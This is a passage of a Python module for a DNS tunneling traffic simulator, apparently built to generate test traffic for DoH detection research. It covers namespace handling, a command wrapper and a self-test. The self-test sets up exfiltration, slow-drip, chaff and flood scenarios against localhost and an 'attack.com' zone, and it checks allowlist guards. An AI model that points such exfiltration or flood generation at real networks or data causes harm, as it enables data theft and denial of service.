            _run_ip(["netns", "exec", name, "ip", "link", "set", "lo", "up"],
                    self._sim._log)
            # Save the namespace name on the simulator, so that a
            # failure path can also destroy it.
            self._sim._namespace_name = name
            return name
        except Exception:
            self._cleanup()
            raise

    def __exit__(self, exc_type, exc_val, exc_tb) -> None:
        self._cleanup()

    def _cleanup(self) -> None:
        if self._created and self._name is not None:
            try:
                _run_ip(["netns", "delete", self._name], self._sim._log)
            except Exception as e:
                self._sim._log.warning(
                    "namespace_delete_failed",
                    name=self._name, error=str(e),
                )
            self._created = False
            self._sim._namespace_name = None


def _run_ip(args: List[str], log) -> None:
    """
    Run an `ip` subcommand. Raise NamespaceError on failure.

    A missing `ip` binary is a hard error: the namespace cannot be
    created without it, and the guards cannot be enforced.
    """
    if shutil.which("ip") is None:
        raise NamespaceError(
            "`ip` (iproute2) is not installed. The isolation guard "
            "requires it. Install with: apt-get install iproute2 "
            "(or use the Dockerfile)."
        )
    cmd = ["ip"] + args
    try:
        result = subprocess.run(
            cmd, check=False, capture_output=True, text=True, timeout=30,
        )
    except subprocess.TimeoutExpired as e:
        raise NamespaceError(f"`ip {' '.join(args)}` timed out") from e
    if result.returncode != 0:
        raise NamespaceError(
            f"`ip {' '.join(args)}` failed with exit code "
            f"{result.returncode}: {result.stderr.strip()}"
        )
    log.debug("ip_command", cmd=" ".join(cmd), rc=result.returncode)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

__all__ = [
    "DNSTunnelingSimulator",
    "ScenarioConfig",
    "parse_scenario",
    "validate_safety_guards",
    "SUPPORTED_SCENARIOS",
    "AttackError",
    "AttackConfigError",
    "IsolationGuardViolation",
    "NamespaceError",
    "EgressDetectedError",
]


# ---------------------------------------------------------------------------
# Self-test
# ---------------------------------------------------------------------------

def _self_test() -> int:
    import sys
    rc = 0
    print("=== dns_tunneling self-test ===")

    # --- Minimal config with all four scenarios ---
    base_attack = {
        "protocol": "doh",
        "target": "127.0.0.1",
        "target_port": 443,
    }
    config = {
        "_includes": {
            "attack_suite": {
                "safety_guards": {
                    "isolation_required": False,   # skip in self-test
                    "target_must_be_local": True,
                    "target_must_be_local_cidr_allowlist_placeholder": None,
                    "target_cidr_allowlist": ["127.0.0.0/8", "10.0.0.0/8"],
                    "no_privileged_ports": True,
                    "min_port": 1024,
                    "no_external_network": False,  # skip in self-test
                },
                "runtime": {
                    "global_rate_cap_pps": 200_000,
                    "global_duration_cap_seconds": 600,
                    "capture_pcap": False,
                },
                "attacks": [
                    {
                        "id": "A01",
                        "attack_vector": "DNS Tunneling via DoH",
                        "protocol": "doh",
                        "target": "127.0.0.1",
                        "target_port": 53,   # the DNS port exception
                        "rate": {"value": 20, "unit": "queries_per_minute"},
                        "duration_seconds": 120,
                        "payload": {
                            "type": "base64_encoded_subdomain",
                            "encoding": "base64",
                            "record_types": ["A"],
                            "source_file": "/tmp/e3doh_selftest_exfil.bin",
                            "source_size_bytes": 1024,
                            "attack_zone": "attack.com",
                        },
                    },
                    {
                        "id": "A06",
                        "attack_vector": "Slow-Drip Exfiltration",
                        "protocol": "doh",
                        "target": "127.0.0.1",
                        "target_port": 443,
                        "rate": {"value": 1, "unit": "queries_per_second"},
                        "duration_seconds": 10,   # short for self-test
                        "payload": {
                            "type": "slow_drip_exfiltration",
                            "inter_query_delay_s": [1.0, 4.0],
                            "source_file": "/tmp/e3doh_selftest_secrets.txt",
                            "source_size_bytes": 2048,
                            "attack_zone": "attack.com",
                        },
                    },
                    {
                        "id": "A10",
                        "attack_vector": "Adaptive Chaff Injection",
                        "protocol": "doh",
                        "target": "127.0.0.1",
                        "target_port": 443,
                        "rate": {"value": 100, "unit": "queries_per_second"},
                        "duration_seconds": 2,   # short for self-test
                        "payload": {
                            "type": "gan_adaptive_chaff",
                            "gan_generator": "surrogate",
                            "attack_zone": "attack.com",
                        },
                    },
                    {
                        "id": "A11",
                        "attack_vector": "DNS Query Flood",
                        "protocol": "doh",
                        "target": "127.0.0.1",
                        "target_port": 443,
                        "rate": {"value": 1000, "unit": "queries_per_second"},  # small for self-test
                        "duration_seconds": 1,   # short for self-test
                        "payload": {
                            "type": "query_flood",
                            "clients": 10,
                            "attack_zone": "attack.com",
                        },
                    },
                ],
            },
        },
        "runtime": {"seed": 42},
    }

    # 1. Parse each scenario.
    for sid in SUPPORTED_SCENARIOS:
        try:
            sc = parse_scenario(sid, config)
            print(f"[OK]   parse {sid}: {sc.attack_vector}, "
                  f"target={sc.target}:{sc.target_port}, "
                  f"rate={sc.rate_hz():.2f} Hz, "
                  f"duration={sc.duration_seconds}s, "
                  f"n_packets={sc.n_packets()}")
        except AttackConfigError as e:
            print(f"[FAIL] parse {sid}: {e}")
            rc = 1

    # 2. Unknown scenario is rejected.
    try:
        parse_scenario("A99", config)
    except AttackConfigError:
        print(f"[OK]   unknown scenario A99 rejected")
    else:
        print(f"[FAIL] unknown scenario A99 was accepted")
        rc = 1

    # 3. Target-in-allowlist works.
    if not _target_in_allowlist("127.0.0.1", ["127.0.0.0/8"]):
        print(f"[FAIL] 127.0.0.1 not in 127.0.0.0/8")
        rc = 1
    else:
        print(f"[OK]   target_in_allowlist: 127.0.0.1 in 127.0.0.0/8")
    if _target_in_allowlist("8.8.8.8", ["127.0.0.0/8", "10.0.0.0/8"]):
        print(f"[FAIL] 8.8.8.8 incorrectly in local allowlist")
        rc = 1
    else:
        print(f"[OK]   target_in_allowlist: 8.8.8.8 not in local allowlist")

    # 4. Construct a simulator (with guards skipped).
    sim = DNSTunnelingSimulator(config, "A01", seed=42)
    if sim.scenario.scenario_id != "A01":
        print(f"[FAIL] scenario id: {sim.scenario.scenario_id}")
        rc = 1
    else:
        print(f"[OK]   DNSTunnelingSimulator constructed for A01")

    # 5. Skip guards and generate packets (scapy).
    try:
        packets = sim.generate_packets()
        if len(packets) != sim.scenario.n_packets():
            print(f"[FAIL] packet count: {len(packets)} vs "
                  f"{sim.scenario.n_packets()}")
            rc = 1
        elif not all(hasattr(p, "time") for p in packets):
            print(f"[FAIL] some packets have no time attribute")
            rc = 1
        else:
            print(f"[OK]   A01: {len(packets)} packets generated")
            # The first packet's payload should be a valid DNS query.
            first = packets[0]
            payload = bytes(first.payload)
            if len(payload) < 12:
                print(f"[FAIL] first packet payload too short: {len(payload)}")
                rc = 1
            else:
                # DNS header is 12 bytes; check the ID field is 0x1234.
                dns_id = struct.unpack("!H", payload[:2])[0]
                if dns_id != 0x1234:
                    print(f"[FAIL] first packet DNS ID: {dns_id:#x}")
                    rc = 1
                else:
                    print(f"[OK]   A01: first packet is a DNS query "
                          f"(ID={dns_id:#x}, {len(payload)} bytes)")
    except AttackError as e:
        print(f"[WARN] scapy not available; skipping packet generation: {e}")

    # 6. Slow-drip generates a random inter-query delay.
    sim06 = DNSTunnelingSimulator(config, "A06", seed=42)
    try:
        packets06 = sim06.generate_packets()
        times = [p.time for p in packets06]
        diffs = [times[i+1] - times[i] for i in range(len(times)-1)]
        if diffs and not all(1.0 <= d <= 4.0 for d in diffs):
            print(f"[FAIL] A06 inter-query delays out of [1,4]: "
                  f"{diffs[:5]}")
            rc = 1
        else:
            print(f"[OK]   A06: {len(packets06)} packets, "
                  f"inter-query delays in [1,4]s")
    except AttackError as e:
        print(f"[WARN] A06 packet generation skipped: {e}")

    # 7. Chaff payload is well-formed DNS.
    sim10 = DNSTunnelingSimulator(config, "A10", seed=42)
    try:
        packets10 = sim10.generate_packets()
        print(f"[OK]   A10: {len(packets10)} chaff packets generated")
    except AttackError as e:
        print(f"[WARN] A10 packet generation skipped: {e}")

    # 8. Flood generates the configured number of packets.
    sim11 = DNSTunnelingSimulator(config, "A11", seed=42)
    try:
        packets11 = sim11.generate_packets()
        if len(packets11) != 1000:  # 1000 Hz × 1 s
            print(f"[FAIL] A11 packet count: {len(packets11)} vs 1000")
            rc = 1
        else:
            print(f"[OK]   A11: {len(packets11)} flood packets generated")
    except AttackError as e:
        print(f"[WARN] A11 packet generation skipped: {e}")

    # 9. Determinism: same seed → same packets.
    sim_a = DNSTunnelingSimulator(config, "A01", seed=42)
    sim_b = DNSTunnelingSimulator(config, "A01", seed=42)
    try:
        p_a = sim_a.generate_packets()
        p_b = sim_b.generate_packets()
        if len(p_a) != len(p_b):
            print(f"[FAIL] determinism: {len(p_a)} vs {len(p_b)}")
            rc = 1
        else:
            print(f"[OK]   determinism: same seed produces {len(p_a)} packets")
    except AttackError:
        pass

    # 10. Safety guard: target outside allowlist raises.
    bad_config = {
        "_includes": {
            "attack_suite": {
                **config["_includes"]["attack_suite"],
                "safety_guards": {
                    "isolation_required": False,
                    "target_must_be_local": True,
                    "target_cidr_allowlist": ["127.0.0.0/8"],
                    "no_privileged_ports": False,
                    "no_external_network": False,
                },
            },
        },
        "runtime": {"seed": 42},
    }
    # Change A01 target to a public address.
    bad_config["_includes"]["attack_suite"] = {
        **config["_includes"]["attack_suite"],
    }
    bad_config["_includes"]["attack_suite"]["attacks"] = [
        {**a, "target": "8.8.8.8"} if a["id"] == "A01" else a
        for a in config["_includes"]["attack_suite"]["attacks"]
    ]
    bad_config["_includes"]["attack_suite"]["safety_guards"] = {
        "isolation_required": False,
        "target_must_be_local": True,
        "target_cidr_allowlist": ["127.0.0.0/8"],
        "no_privileged_ports": False,
        "no_external_network": False,
    }
    bad_sim = DNSTunnelingSimulator(bad_config, "A01", seed=42)
    try:
        validate_safety_guards(bad_sim._scenario, bad_sim._guards, bad_sim._log)
    except IsolationGuardViolation:
        print(f"[OK]   safety guard: public target rejected")
    else:
        print(f"[FAIL] safety guard: public target was accepted")
        rc = 1

    # 11. Privileged port without A01 exception raises.
    # Change A06's port to 53 (A01 exception does not apply).
    priv_config = {
        "_includes": {
            "attack_suite": {
                **config["_includes"]["attack_suite"],
                "attacks": [
                    {**a, "target_port": 53} if a["id"] == "A06" else a
                    for a in config["_includes"]["attack_suite"]["attacks"]
                ],
                "safety_guards": {
                    "isolation_required": False,
                    "target_must_be_local": True,
                    "target_cidr_allowlist": ["127.0.0.0/8"],
                    "no_privileged_ports": True,
                    "min_port": 1024,
                    "no_external_network": False,
                },
            },
        },
        "runtime": {"seed": 42},
    }
    priv_sim = DNSTunnelingSimulator(priv_config, "A06", seed=42)
    try:
        validate_safety_guards(priv_sim._scenario, priv_sim._guards, priv_sim._log)
    except IsolationGuardViolation:
        print(f"[OK]   safety guard: privileged port rejected for A06")
    else:
        print(f"[FAIL] safety guard: privileged port was accepted for A06")
        rc = 1

    # 12. A01 privileged port 53 is allowed (the exception).
    a01_sim = DNSTunnelingSimulator(config, "A01", seed=42)
    try:
        validate_safety_guards(a01_sim._scenario, a01_sim._guards, a01_sim._log)
        print(f"[OK]   safety guard: A01 privileged port 53 allowed (exception)")
    except (IsolationGuardViolation, EgressDetectedError) as e:
        # The isolation guard is False in this config, so we should
        # not reach here. But if a guard did fail, report it.
        print(f"[FAIL] A01 port-53 exception did not apply: {e}")
        rc = 1

    print("=== self-test complete ===")
    return rc


if __name__ == "__main__":
    import sys
    sys.exit(_self_test())
